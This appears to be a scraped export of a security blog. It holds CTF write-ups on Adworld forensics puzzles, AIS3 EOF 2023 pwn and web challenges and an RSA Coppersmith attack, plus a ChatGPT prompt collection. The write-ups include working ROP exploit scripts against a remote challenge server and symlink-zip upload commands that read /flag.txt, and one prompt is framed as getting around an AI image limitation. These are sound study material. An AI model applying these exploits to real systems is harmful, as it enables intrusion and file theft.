知乎\n"},{"id":17,"href":"/security/practice/adworld/misc/adworld---3-1/","title":"Adworld - 3-1","section":"Securities","content":" Adworld - 3-1 # Recon # 這一題很簡單，和之前幾題有點像\n用file看一下給的檔案是一個.rar壓縮檔，改個副檔名後解壓縮出現另外一個檔案 再用file看一下是一個pcapng檔案，用wireshark分析 用一些基本的技巧(Follow TCP Stream/Extract Object\u0026hellip;)看tcp stream，會發現一個bash的command紀錄，有一個python enc/dec flow，和一串base64的string，除此之外還可以用extract object把一些file dump下來，發現是另外一個加密的flag.rar檔案，我們的任務就是要從這個pcapng檔案中把加密的密碼找出來 用python腳本解密base64 string，會輸出b'passwd={No_One_Can_Decrypt_Me}\\x00\\x00' 解密壓縮檔flag就出來了 Exploit # Write Byte Data\nfrom base64 import b64decode import zipfile f = open(\u0026#39;./basezip.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split(\u0026#39;,\u0026#39;)[-1] f1 = open(\u0026#39;./cipher.zip\u0026#39;, \u0026#39;wb\u0026#39;) f1.write(b64decode(f)) print(bytes.fromhex(b64decode(f).hex()).decode(\u0026#39;cp437\u0026#39;)) f1.close() Decrypt Part\nfrom Crypto.Cipher import AES import base64 IV = b\u0026#39;QWERTYUIOPASDFGH\u0026#39; str1 = \u0026#39;19aaFYsQQKr+hVX6hl2smAUQ5a767TsULEUebWSajEo=\u0026#39; def decrypt(encrypted): aes = AES.new(IV, AES.MODE_CBC, IV) return aes.decrypt(encrypted) def encrypt(message): length = 16 count = len(message) padding = length - (count % length) message = message + \u0026#39;\\0\u0026#39; * padding aes = AES.new(IV, AES.MODE_CBC, IV) return aes.encrypt(message) str = \u0026#39;this is a test\u0026#39; example = decrypt(base64.b64decode(str1)) print(example) Reference # 【攻防世界AD】Misc进阶区：3-1\n"},{"id":18,"href":"/security/practice/adworld/misc/adworld---miao~/","title":"Adworld - miao~","section":"Securities","content":" Adworld - miao~ # Recon # 這題也是看了別人的WP1和官解\nExploit # 用foremost搜索或救援檔案(神奇的解法，一開始完全想不到)\n$ foremost -v miao\\~.jpg Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus Audit File Foremost started at Sat Jul 15 15:21:29 2023 Invocation: foremost -v miao~.jpg Output directory: /home/sbk6401/CTF/Adworld/Misc/miao~/output Configuration file: /etc/foremost.conf Processing: miao~.jpg |------------------------------------------------------------------ File: miao~.jpg Start: Sat Jul 15 15:21:29 2023 Length: 1 MB (1242752 bytes) Num Name (bs=512) Size File Offset Comment 0: 00000000.jpg 55 KB 0 1: 00000111.wav 1 MB 57212 *| Finish: Sat Jul 15 15:21:29 2023 2 FILES EXTRACTED jpg:= 1 rif:= 1 ------------------------------------------------------------------ Foremost finished at Sat Jul 15 15:21:29 2023 可以看到抓到其中有一個.wav檔案\n分析音檔 用audacity開頻譜圖，可以看到CatCTF的字樣 用DeepSound的軟體解密，而密碼就是上面拿到的CatCTF Decode Encrypted Flag 用獸語online decode\n~呜喵喵喵喵呜呜啊呜啊呜喵呜呜~喵啊喵啊喵啊呜喵呜~~~喵~呜喵啊喵啊喵喵喵呜呜~呜~呜喵呜呜啊啊~呜啊喵啊呜喵呜呜啊~喵~呜呜喵喵~喵喵喵呜呜呜喵~呜喵呜呜啊~呜啊啊喵啊呜喵呜呜喵~喵~呜喵呜~~喵喵喵呜啊呜啊喵呜喵呜呜啊~呜啊啊喵啊呜~啊喵~~喵~呜呜喵喵喵喵喵喵呜啊呜呜~呜喵呜呜~喵~喵啊喵啊呜~~啊啊~喵~呜呜喵喵啊喵喵喵呜呜呜呜~呜喵呜呜~呜啊~啊喵啊呜~~啊啊~喵~呜呜喵喵呜喵喵喵呜啊喵呜喵呜喵呜呜啊呜啊啊啊喵啊呜喵喵呜啊~喵~呜喵呜喵喵喵喵喵呜啊喵喵呜呜喵呜呜~喵~啊啊喵啊呜~~啊啊~喵~呜喵呜~啊喵喵喵呜呜~喵啊呜喵呜呜啊啊呜喵啊喵啊呜~呜~喵~喵~呜呜喵喵喵喵喵喵呜啊喵喵啊呜喵呜呜~呜呜呜啊喵啊呜喵呜啊喵啊 Flag: CatCTF{d0_y0u_Hate_c4t_ba3k1ng_?_M1ao~}\nReference # ZimaBlue WP\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":19,"href":"/security/practice/adworld/misc/adworld---misc%E6%96%87%E4%BB%B6%E9%A1%9E%E5%9E%8B/","title":"Adworld - Misc文件類型","section":"Securities","content":" Adworld - Misc文件類型 # Source Code # 3436455341425F554573444242514141 41414941416C64434658714F7737634B 4141414143594141414149414141415A 6D78685A7935306548524C79306C4D72 7A5A49536B303253457778546B6B304D 6A5130546A593353445531534573784E 544D3054374A494E552B7A7241554155 45734241685141464141414141674143 56304956656F374474776F414141414A 674141414167414A4141414141414141 414167414141414141414141475A7359 57637564486830436741674141414141 41414241426741477845666B39697132 41456245522B54324B725941514A462B 34725971746742554573464267414141 41414241414541576741414145344141 4141414141 Recon # 這一題有一點通靈，沒有很喜歡\n首先給的cipher很明顯是ascii的hex 轉換過後也很明顯是base64 在轉換過後，只有底線後面的部分要轉換成hex 如果把東西print出來的話會看到flag.txt的字樣，感覺上是一個file的byte code，到file signature去看會發現magic header是一個zip file，uncompress之後就會發現flag.txt Exploit # import base64 cipher = \uu0026#34; cipher = bytes.fromhex(cipher).decode(\u0026#39;utf-8\u0026#39;).split(\u0026#34;_\u0026#34;)[1] cipher = base64.b64decode(cipher + \u0026#34;==\u0026#34;) f = open(\u0026#34;./cipher.zip\u0026#34;, \u0026#34;wb\u0026#34;) f.write(cipher) f.close() import zipfile with zipfile.ZipFile(\u0026#39;./cipher.zip\u0026#39;, \u0026#39;r\u0026#39;) as zip_ref: zip_ref.extractall(\u0026#39;./\u0026#39;) f = open(\u0026#39;./flag.txt\u0026#39;, \u0026#39;r\u0026#39;).read() print(f) $ python exp.py flag{0bec0ad3da2113c70e50fd5617b8e7f9} Reference # XCTF-MISC-Misc文件類型\n"},{"id":20,"href":"/security/practice/adworld/misc/adworld---pure_color/","title":"Adworld - pure_color","section":"Securities","content":" Adworld - pure_color # tags: Adworld CTF Misc # Challenge: https://adworld.xctf.org.cn/challenges/details?hash=f216ffab-e01d-46b8-9d4d-d91ab5229eed_2\u0026task_category_id=1\nBackground # 【Day21】隱寫技術 Steganography 图片隐写查看神器stegsolve使用方法 zardus/ctf-tools - stegsolve\nExploit - Basic Steganography # "},{"id":21,"href":"/security/practice/adworld/misc/adworld---%E5%BF%83%E5%84%80%E7%9A%84%E5%85%AC%E5%8F%B8/","title":"Adworld - 心儀的公司","section":"Securities","content":" Adworld - 心儀的公司 # tags: Adworld CTF Misc # Challenge: https://adworld.xctf.org.cn/challenges/details?hash=ed5d10bf-be47-4e61-b04e-3a9ccb73ff95_2\u0026task_category_id=1\nExploit # $ strings webshell.pcapng | grep \u0026#34;{\u0026#34; ... fl4g:{ftop_Is_Waiting_4_y} Reference # 心仪的公司writeup 【CTF视频合辑】MISC-流量分析题大集合(第一辑)\n"},{"id":22,"href":"/security/practice/adworld/misc/adworld---%E9%81%A9%E5%90%88%E4%BD%9C%E7%82%BA%E6%A1%8C%E9%9D%A2/","title":"Adworld - 適合作為桌面","section":"Securities","content":" Adworld - 適合作為桌面 # tags: Adworld CTF Misc # Challenge: 適合作為桌面\nBackground # Day8 Python基礎-pyc是什麼\nExploit # Analyze Steganography QR Code Reader\nt seems a byte code of a file.\nHxD It can be disassembled by pyc tools.\npyc disassemble :::spoiler\ndef flag(): str = [ 102, 108, 97, 103, 123, 51, 56, 97, 53, 55, 48, 51, 50, 48, 56, 53, 52, 52, 49, 101, 55, 125, ] flag = \u0026#34;\u0026#34; for i in str: flag += chr(i) print flag :::\nReference # XCTF练习题\u0026mdash;MISC\u0026mdash;适合作为桌面\n"},{"id":23,"href":"/knowledge/ai-prompt/","title":"AI Prompt","section":"Knowledges","content":" AI Prompt # ChatGPT # :::spoiler 萬用提示詞 / 來源\n你是一個專家級ChatGPT提示工程師，在各種主題方面皆具有專業知識。在我們的互動過程中，你會稱我為「SBK」。讓我們合作創建最好的ChatGPT響應我提供的提示。 我們將進行如下交互： 1.我會告訴你如何幫助我。 2.根據我的要求，您將建議您應該承擔的其他專家角色，除了成為專家級ChatGPT提示工程師之外，以提供最佳響應。然後，您將詢問是否應繼續執行建議的角色，或修改它們以獲得最佳結果。 3.如果我同意，您將採用所有其他專家角色，包括最初的Expert ChatGPT Prompt Engineer角色。 4.如果我不同意，您將詢問應刪除哪些角色、消除這些角色，並保留剩餘的角色，包括專家級ChatGPT Prompt工程師角色，然後再繼續。 5.您將確認您的活動專家角色，概述每個角色下的技能，並詢問我是否要修改任何角色。 6.如果我同意，您將詢問要添加或刪除哪些角色，我將通知您。重覆步驟5，直到我對角色滿意為止。 7.如果我不同意，請繼續下一步。 8.你會問：\u0026#34;我怎樣才能幫助【我對步驟1的回答】\u0026#34;？ 9.我會給出我的答案。 10.你會問我是否想使用任何參考來源來製作完美的提示。 11.如果我同意，你會問我想使用的來源數量。 12.您將單獨請求每個來源，在您查看完後確認，並要求下一個。繼續，直到您查看了所有源，然後移動到下一步。 13.您將以列出表格的方式，請求有關我的原始提示的更多細節，以充分了解我的期望。 14.我會回答你的問題。 15. 從這一點開始，您將在所有確認的專家角色下操作，並使用我的原始提示和步驟14中的其他細節創建詳細的ChatGPT提示。提出新的提示並徵求我的反饋。 16.如果我滿意，您將描述每個專家角色的貢獻以及他們將如何協作以產生全面的結果。然後，詢問是否缺少任何輸出或專家。 16-1.如果我同意，我將指出缺少的角色或輸出，您將在重覆步驟15之前調整角色。 16-2.如果我不同意，您將作為所有已確認的專家角色執行提供的提示，並生成步驟15中概述的輸出。繼續執行步驟20。 17.如果我不滿意，你會問具體問題的提示。 18.我將提供補充資料。 19 按照步驟15中的流程，生成新提示，並考慮我在步驟18中的反饋。 20.完成回覆後，詢問我是否需要任何更改。 21.如果我同意，請您求我所需的更改，參考您之前的回覆，進行所需的調整，並生成新的提示。重覆步驟15到步驟20，直到我對提示符滿意為止。如果你完全理解你的任務，回答：\u0026#34;我今天能幫你什麽， SBK\u0026#34; :::\n:::spoiler 解開ChatGPT無法提供圖片的prompt / 來源\n從現在開始當我請你發照片時，使用 Markdown語法，不要使用反斜線及程式碼。使用 Unsplash API(https://source.unsplash.com/960x640/?\u0026lt;關鍵詞\u0026gt;)。如果你理解這個指令的話, 請回答我沒問題 :::\n:::spoiler 有架構的問問題 / 來源\nLet\u0026#39;s think step by step ----- Role: You are a {ex:面試求職專家} ----- Task illustration: {ex:寫一封求職履歷} Job Description: Data Analysis, SQL, BI 工作經驗... ----- Output: {ex: CSV or Markdown Language} :::\n"},{"id":24,"href":"/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/","title":"AIS3 EOF 2023 初賽","section":"Securities","content":" AIS3 EOF 2023 初賽 # PWN # real_rop # Description # Challenge URL\nFolder structure:\nShare ├── share │ ├── chal │ ├── flag │ ├── Makefile │ ├── real_rop++.c │ └── run.sh ├── docker-compose.yaml ├── Dockerfile └── xinetd Original Code # #include \u0026lt;unistd.h\u0026gt; int main() { char buf[0x10]; read(0, buf, 0x30); write(1, buf, 0x30); return 0; } gcc -fno-stack-protector -o chal real_rop++.c Obviously buffer overflow but not much Preliminary idea is one_gadget Check protector $ checksec chal [*] \u0026#39;/home/sbk6401/CTF/AIS3/PWN/real_rop/share/chal\u0026#39; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled PIE is enabled → use write function to leak libc address Full RELRO → cannot use GOT hijacking Refer to 大神write up, we cannot leak libc address and get shell at one time. So, we can control $rip and return to the beginning of main function and go through the process again. That is, we have another read function to fill in one_gadget. Note that, the version of Ubuntu and Glibc is VERY VERY important, according to Dockerfile, it seems use Ubuntu 20.04 with default FROM ubuntu:20.04 MAINTAINER u1f383 RUN apt-get update \u0026amp;\u0026amp; \\ DEBAIN_FRONTEND=noninteractive apt-get install -qy xinetd RUN useradd -m chal RUN chown -R root:root /home/chal RUN chmod -R 755 /home/chal CMD [\u0026#34;/usr/sbin/xinetd\u0026#34;, \u0026#34;-dontfork\u0026#34;] Analyze where to return # For Ubuntu 22.04 \u0026amp;　GLIBC 2.35 - back to __libc_start_main+121\n$ gdb chal pwndbg\u0026gt; starti pwndbg\u0026gt; vmmap pwndbg\u0026gt; b _start Breakpoint 15 at 0x555555555080 (2 locations) pwndbg\u0026gt; c pwndbg\u0026gt; pwndbg\u0026gt; b __libc_start_main Breakpoint 16 at 0x7ffff7db8dc0: file ../csu/libc-start.c, line 242. pwndbg\u0026gt; c pwndbg\u0026gt; ni # until \u0026lt;__libc_start_main+123\u0026gt; pwndbg\u0026gt; s pwndbg\u0026gt; ni # until \u0026lt;__libc_start_main+123\u0026gt; pwndbg\u0026gt; s pwndbg\u0026gt; ni # until \u0026lt;main+62\u0026gt; Overall, the sequence is: # _start → 0x0000555555555080 __libc_start_main+123 → 0x00007ffff7db8e3b __libc_start_call_main+126 → 0x00007ffff7db8d8e _start ... _start+31 ↓ __libc_start_main ... __libc_start_main+123 ↓ __libc_start_call_main ... __libc_start_call_main+126 ↓ main ... __libc_start_call_main+128 __libc_start_call_main+130 ↓ exit For Ubuntu 20.04 \u0026amp;　GLIBC 2.31 - back to __libc_start_main+236 Whole processes are almost the same as above, just the sequence is different\nOverall, the sequence is: # _start ... _start+40 ↓ __libc_start_main ... __libc_start_main+241 ↓ main ... __libc_start_main+243 __libc_start_main+245 ↓ exit Exploit - leak libc address + one_gadget # Use Ubuntu 20.04 that the same as remote server\nTry to control $rip and return to beginning We can observe stack at the end of main function. It\u0026rsquo;ll always return to __libc_start_main+243. Therefore, we can padding garbage bytes and overlap the last byte of $rip. payload = p64(0) * 3 + int.to_bytes(124, 1, \u0026#39;little\u0026#39;) According to the derivation of last section, we should return to __libc_start_main+236(the address is 0x7ffff7df007c for temp) and the address of __libc_start_main+243 is 0x7ffff7df0083(temp), so that we just modify the last bytes → $0x73=124$ Try to leak libc offset - write function + gdb We can observe stack situation before sending payload. The first 3*8 bytes are garbage bytes that we filled at first round. r.recv(0x18) libc_addr = u64(r.recv(6) + b\u0026#39;\\x00\\x00\u0026#39;) - 0x24083 + 0x7 Skip garbage bytes first then receive 6 bytes. Note that - 0x24083 + 0x7 is try and error so that it can be 0x7f07a24fb00(temp) checked by vmmap. Construct one_gadget Use vmmap to check which libc version be used - /lib/x86_64-linux-gnu/libc-2.31.so $ one_gadget /lib/x86_64-linux-gnu/libc-2.31.so ... 0xe3afe execve(\u0026#34;/bin/sh\u0026#34;, r15, r12) constraints: [r15] == NULL || r15 == NULL [r12] == NULL || r12 == NULL ... $ ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.31.so --only \u0026#34;pop|ret\u0026#34; --multibr \u0026gt; one_gadget $ vim one_gadget pop_r15_ret = libc_addr + 0x2a3e4 pop_r12_ret = libc_addr + 0x2f709 r.send(p64(0) * 3 + p64(pop_r12_ret) + p64(0) + p64(libc_addr+0xe3afe)) Note that $r15 has NULL already before read function, so it\u0026rsquo;s no need to send pop_r15_ret. Then we got shell!!! Reference # gdb指令 Linux中誰來呼叫C語言中的main? Docker exec 命令\nhow2know_revenge # Description # Challenge: nc edu-ctf.zoolab.org 10012 Environment Version: Ubuntu 20.04 Folder structure: Share ├── share │ ├── chal │ ├── flag │ ├── Makefile │ ├── how2know_revenge.c │ └── run.sh ├── docker-compose.yaml ├── Dockerfile └── xinetd Original Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;seccomp.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; static char flag[0x30]; int main() { char addr[0x10]; int fd; scmp_filter_ctx ctx; fd = open(\u0026#34;/home/chal/flag\u0026#34;, O_RDONLY); if (fd == -1) perror(\u0026#34;open\u0026#34;), exit(1); read(fd, flag, 0x30); close(fd); write(1, \u0026#34;talk is cheap, show me the rop\\n\u0026#34;, 31); read(0, addr, 0x1000); ctx = seccomp_init(SCMP_ACT_KILL); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); seccomp_load(ctx); seccomp_release(ctx); return 0; } $ gcc -static -fno-stack-protector -o chal how2know_revenge.c -lseccomp $ checksec chal [*] \u0026#39;/home/sbk6401/CTF/AIS3/PWN/how2know_revenge/share/chal\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Description \u0026amp; Preliminary Idea # The whole process flow is almost the same as how2know. The difference is global variable turned into local variable and it has buffer overflow obviously. So, we can find various ROP and access into it and brute force to compare the single char of the flag.\nExploit - ROP + how2know # Find flag address → 0x4de2e0 $ objdump -d -M Intel chal | grep \u0026#34;\u0026lt;flag\u0026gt;\u0026#34; 401cfe: 48 8d 35 db c5 0d 00 lea 0xdc5db(%rip),%rsi # 4de2e0 \u0026lt;flag\u0026gt; Create ROP chain $ ROPgadget --binary chal --multibr \u0026gt; rop_gadget $ vim rop_gadget pop_r14_ret = 0x402797 mov_eax_dword_ptr_rax_ret = 0x4022ee cmp_al_r14b_ret = 0x438c15 jne_0x426148_ret = 0x426159 pop_rbx_ret = 0x401fa2 jmp_rbx = 0x4176fd infinite_loop = p64(pop_rbx_ret) + p64(jmp_rbx) + p64(jmp_rbx) ROP = flat( pop_rax_ret, flag_addr+idx, mov_eax_dword_ptr_rax_ret, pop_r14_ret, guess, cmp_al_r14b_ret, jne_0x426148_ret, ) ROP += infinite_loop Move the flag address to $rax, and move the flag string to $eax next Then put our guess single char to $r14 Compare $al and $r14b If correct, go into infinity loop, otherwise, jump to 0x426148 How to know the single char in pwntool side? When the comparison is correct, it\u0026rsquo;ll access into infinity loop and recv function will receive something then break while loop and close the connection, otherwise, it\u0026rsquo;ll jump to 0x426148 and trigger timeout exception. r.sendafter(b\u0026#39;rop\\n\u0026#39;,b\u0026#39;a\u0026#39;*0x28 + ROP) try : # If compare not correct, guess++ and access to infinity loop r.recv(timeout=0.5) break except: # If compare correct, pwntool will break out guess += 1 r.close() Repeat flag = \u0026#39;\u0026#39; idx = 0 while idx \u0026lt; 48: guess = 0x20 while guess \u0026lt; 0x80 : r = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;, 10012) {create ROP} r.sendafter(b\u0026#39;rop\\n\u0026#39;,b\u0026#39;a\u0026#39;*0x28 + ROP) try : ... except: ... r.close() idx += 1 flag += chr(guess) Whole exploit from pwn import * context.arch = \u0026#39;amd64\u0026#39; flag_addr = 0x4de2e0 pop_r14_ret = 0x402797 mov_eax_dword_ptr_rax_ret = 0x4022ee cmp_al_r14b_ret = 0x438c15 jne_0x426148_ret = 0x426159 pop_rbx_ret = 0x401fa2 jmp_rbx = 0x4176fd infinite_loop = p64(pop_rbx_ret) + p64(jmp_rbx) + p64(jmp_rbx) flag = \u0026#39;\u0026#39; idx = 0 while idx \u0026lt; 53: guess = 0x20 while guess \u0026lt; 0x80 : # r = process(\u0026#39;./chal\u0026#39;) r = remote(\u0026#39;edu-ctf.zoolab.org\u0026#39;, 10012) ROP = flat( pop_rax_ret, flag_addr+idx, mov_eax_dword_ptr_rax_ret, pop_r14_ret, guess, cmp_al_r14b_ret, jne_0x426148_ret, ) ROP += infinite_loop r.sendafter(b\u0026#39;rop\\n\u0026#39;,b\u0026#39;a\u0026#39;*0x28 + ROP) try : # If compare not correct, guess++ and access to infinity loop r.recv(timeout=0.5) break except: # If compare correct, pwntool will break out guess += 1 r.close() idx += 1 flag += chr(guess) print(flag) print(flag) r.interactive() Note that: The exploit program will be affected by the internet connection and caused the result is wrong like this: FLA!{CORORO_f8b7d5d23ad03512P6687384b7a2a/00} \u0026#39;LAG{CORORO_f8b7d5d23ad03512d6687384b7a2a500} *LAG{C*RORO_f8b7d5d23ad03512d6687384b7a2a500} FLAG{CO#/RO_f8b7d5d23ad03512d6687384b7a2a500} FLAG{CAMORO_f8b7d5d/3ad03512d6687384!7a2a500xX Thus, you can run much more times to compare the result together so that you can patch up the flag correctly. Reference # EOF 2023\nWeb # Share # Description # Challenge URL\nFolder structure:\nShare ├── Web │ ├── src │ │ ├── static │ │ │ └── {None} │ │ ├── template │ │ │ ├── index.html │ │ │ └── login.html │ │ └── app.py │ └── Dockerfile ├── docker-compose.yaml └── flag This website function is let the user can upload compress folder (*.zip) and the compress folder must contains a index.html file so that it can uncompress the folder then redirect to this new page.\nTo solve this question, we must use symbolic link\nObservation # Main program first - app.py This part is aim to unzip the compress folder and redirect to new page - index.html that the user provide ... @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def upload_file(): if \u0026#39;user\u0026#39; not in session: return \u0026#39;Login first\u0026#39; if \u0026#39;file\u0026#39; not in request.files or not request.files[\u0026#39;file\u0026#39;].filename: return \u0026#39;Missing file\u0026#39; _sub = session[\u0026#39;user\u0026#39;] file = request.files[\u0026#39;file\u0026#39;] tmppath = path.join(\u0026#39;/tmp\u0026#39;, urandom(16).hex()) realpath = safeJoin(\u0026#39;/app/static\u0026#39;, _sub) if not realpath: return \u0026#39;No path traversal\u0026#39; if not path.exists(realpath): mkdir(realpath) file.save(tmppath) returncode = run([\u0026#39;unzip\u0026#39;, \u0026#39;-qo\u0026#39;, tmppath, \u0026#39;-d\u0026#39;, realpath]).returncode if returncode != 0: return \u0026#39;Not a zip file\u0026#39; if not path.isfile(path.join(realpath, \u0026#39;index.html\u0026#39;)): return \u0026#39;\u0026#34;index.html\u0026#34; not found\u0026#39; return redirect(realpath[4:]+\u0026#39;/index.html\u0026#39;, code=302) ... docker-compose.yaml We can see that the flag is mounted on /flag.txt version: \u0026#39;3.9\u0026#39; services: web: build: web restart: always ports: - 8080:5000 volumes: - ./flag:/flag.txt:ro Construct Payload # So, our first idea is using symbolic link to create a payload.txt that link to /flag.txt and compress with index.html then upload to the web page.\nPayload\ntouch index.html ln -s /flag.txt payload.txt zip --symlinks -ry index.zip payload.txt index.html Then rewrite the URL like this: https://share.ctf.zoolab.org/static/123/payload.txt\nFLAG{w0W_y0U_r34L1y_kn0w_sYmL1nK!}\nReference # unzipper-ctftime unzipper-mikecat unzipper-nandynarwhals 電腦王-symbolic link Ithelp - symbolic link\n"},{"id":25,"href":"/security/competition/ais3-eof-2024/","title":"AIS3 EOF 2024","section":"Securities","content":" AIS3 EOF 2024 # Crypto # Baby RSA # Source Code # :::spoiler Source Code\n#! /usr/bin/python3 from Crypto.Util.number import bytes_to_long, long_to_bytes, getPrime import os from secret import FLAG def encrypt(m, e, n): enc = pow(bytes_to_long(m), e, n) return enc def decrypt(c, d, n): dec = pow(c, d, n) return long_to_bytes(dec) if __name__ == \u0026#34;__main__\u0026#34;: while True: p = getPrime(1024) q = getPrime(1024) n = p * q phi = (p - 1) * (q - 1) e = 3 if phi % e != 0 : d = pow(e, -1, phi) break print(f\u0026#39;{p=}, {q=}\u0026#39;) print(f\u0026#34;{n=}, {e=}\u0026#34;) print(\u0026#34;FLAG: \u0026#34;, encrypt(FLAG, e, n)) for _ in range(3): try: c = int(input(\u0026#34;Any message for me?\u0026#34;)) m = decrypt(c, d, n) print(\u0026#34;How beautiful the message is, it makes me want to destroy it .w.\u0026#34;) new_m = long_to_bytes(bytes_to_long(m) ^ bytes_to_long(os.urandom(8))) print( \u0026#34;New Message: \u0026#34;, encrypt(new_m, e, n) ) except: print(\u0026#34;?\u0026#34;) exit() :::\nRecon # 這一題也是想了有點久，翻了RSA相關攻擊的手冊，也想不出個所以然，原本以為是那種公鑰指數過小的問題，但這個前提建立在一開始的plaintext不能太大，才可以用開三次方根的方式找flag，先看source code在幹嘛好了\nSetting Up 首先它會先設定基本的RSA需要的公私鑰，以便後續使用 加密Flag Chosen Ciphertext to Decrypt → XOR Random → Encrypt New Plaintext 這一段for loop會做三次，意思是我們可以任意選擇要解密的ciphertext，然後解密完的結果直接和random number XOR，最後return這東西加密的結果 一開始有另外一個想法是chosen ciphertext attack，但我們拿不到解密後的東西，所以也不是這個攻擊，後來看到coppersmith相關攻擊的一系列文章，發現如果我給oracle解密的ciphertext都是前一次拿到的ciphertext的話，有一點點像是Related Message Attack，詳情如下: 已知 $$ \\begin{aligned} ct \u0026amp;= flag^3\\ (mod\\ n)\\ m_1 \u0026amp;= c_1^d\\ (mod\\ n)\\to c_{m_1}=(m_1\\oplus x_1)^3\\ (mod\\ n)\\ m_2 \u0026amp;= c_2^d\\ (mod\\ n)\\to c_{m_2}=(m_2\\oplus x_2)^3\\ (mod\\ n)\\ m_3 \u0026amp;= c_3^d\\ (mod\\ n)\\to c_{m_3}=(m_3\\oplus x_3)^3\\ (mod\\ n)\\ \\end{aligned} $$ 如果我們輸入到oracle的ciphertext，依序為$ct,c_{m_1},c_{m_2}$，則我們會有以下關係 $$ \\begin{aligned} m_1 = c_1^d\\ (mod\\ n)\u0026amp;=ct^d\\ (mod\\ n)=flag^{3\\cdot d}\\ (mod\\ n)=flag\\ \\to c_{m_1}\u0026amp;=(flag\\oplus x_1)^3\\ (mod\\ n)\\ m_2 = c_2^d\\ (mod\\ n)\u0026amp;=c_{m_1}^d\\ (mod\\ n)=(flag\\oplus x_1)^{3\\cdot d}\\ (mod\\ n)=(flag\\oplus x_1)\\ \\to c_{m_2}\u0026amp;=(flag\\oplus x_1\\oplus x_2)^3\\ (mod\\ n)\\ m_3 = c_3^d\\ (mod\\ n)\u0026amp;=c_{m_3}^d\\ (mod\\ n)=(flag\\oplus x_1\\oplus x_2)^{3\\cdot d}\\ (mod\\ n)=(flag\\oplus x_1\\oplus x_2)\\ \\to c_{m_1}\u0026amp;=(flag\\oplus x_1\\oplus x_2\\oplus x_3)^3\\ (mod\\ n)\\ \\end{aligned} $$\n此時他們之間好像就有產生某種關係，但具體來說要怎麼用呢?其實這一題不是用coppersmith的related message attack，但讓他們之間產生關係是一個重要的方向，試想，如果我們可以構造輸入oracle的ciphertext讓XOR的效果相當於加法的話，是不是就是copphersmith short pad的經典公式: $$ M_1=2^m\\cdot M_0+r_1(mod\\ n), 0\\le r_1\\le 2^m $$\nExploit # 其實就是利用RSA的homomorphism，因為random number的大小是$2^{64}$，如果把它加密再和$ct$相乘，其實就是相當於$2^{64}$先和$flag$相乘再加密，如此的話就意味著我們讓flag左移64個bits，這樣的話和random number XOR就相當於是相加，也就符合前面提到的公式: $$ \\begin{aligned} ct\\cdot (2^{64})^3\\ (mod\\ n)\u0026amp;=(flag\\cdot (2^{64}))^3 (mod\\ n)\\ \\to m_1\u0026amp;=c_1^d(mod\\ n)=(flag\\cdot (2^{64}))^{3\\cdot d}(mod\\ n)=flag\\cdot (2^{64})\\ \\to c_{m_1}\u0026amp;=((flag\\cdot (2^{64}))\\oplus x_1)^3 (mod\\ n)=(flag\\cdot (2^{64}) + x_1)^3 (mod\\ n) \\end{aligned} $$ 此時$m=64, x_1=r_1, M_0=flag$ 最後就可以用網路上的script解這一題 :::success 按照script的寫法其實只需要$c_1,c_2$而不用$c_3$，不過我猜這應該是為了加速用的 :::\nimport random import binascii def coppersmith_short_pad(C1, C2, N, e = 3, eps = 1/25): P.\u0026lt;x, y\u0026gt; = PolynomialRing(Zmod(N)) P2.\u0026lt;y\u0026gt; = PolynomialRing(Zmod(N)) g1 = (x^e - C1).change_ring(P2) g2 = ((x + y)^e - C2).change_ring(P2) # Changes the base ring to Z_N[y] and finds resultant of g1 and g2 in x res = g1.resultant(g2, variable=x) # coppersmith\u0026#39;s small_roots only works over univariate polynomial rings, so we # convert the resulting polynomial to its univariate form and take the coefficients modulo N # Then we can call the sage\u0026#39;s small_roots function and obtain the delta between m_1 and m_2. # Play around with these parameters: (epsilon, beta, X) roots = res.univariate_polynomial().change_ring(Zmod(N))\\ .small_roots(epsilon=eps) return roots[0] def franklin_reiter(C1, C2, N, r, e=3): P.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(N)) equations = [x ^ e - C1, (x + r) ^ e - C2] g1, g2 = equations return -composite_gcd(g1,g2).coefficients()[0] # I should implement something to divide the resulting message by some power of 2^i def recover_message(C1, C2, N, e = 3): delta = coppersmith_short_pad(C1, C2, N) recovered = franklin_reiter(C1, C2, N, delta) return recovered def composite_gcd(g1,g2): return g1.monic() if g2 == 0 else composite_gcd(g2, g1 % g2) # Takes a long time for larger values and smaller epsilon def test(): N=15260296688054841855549554033325828358873293445937057389920569532146192328890726838121393944050950190351232165416987793968480778375961512320286620713733356286455203599405722158099636291489826180060449679700054026880237879354536540115264615831706760316440881201436132651317097019418304208021439215011667236669523482581439808329683682128795141376425192173826924615416712285730899753307349656762943655421268926747966939515269846077242406829682284290962771699140604387419648981712582246389043594985801791270844611771178820848918810175963248650295958983777211857033836826221646786729957495826890748780322168924412984487779 C1=10351548746457666093023070232724014377932380096423069950989103648868875511007947184289185676200140221909002758431947121469375287681244319912044188141683962234677293700596069171405208338862563281150083113679010897842383719812470727069997150147494671147672148504227497757675621193794117898391543172086809862763316251226923471818589257291824424391360674143689004251474882930419221713916085307268300284044606184117563102086425097578053881624744573221389135689666807537427347410651958667657089770097109198133983764684581257561633060956647142879292145919275398992281069384432727737626638048613926042038962997027925735957303 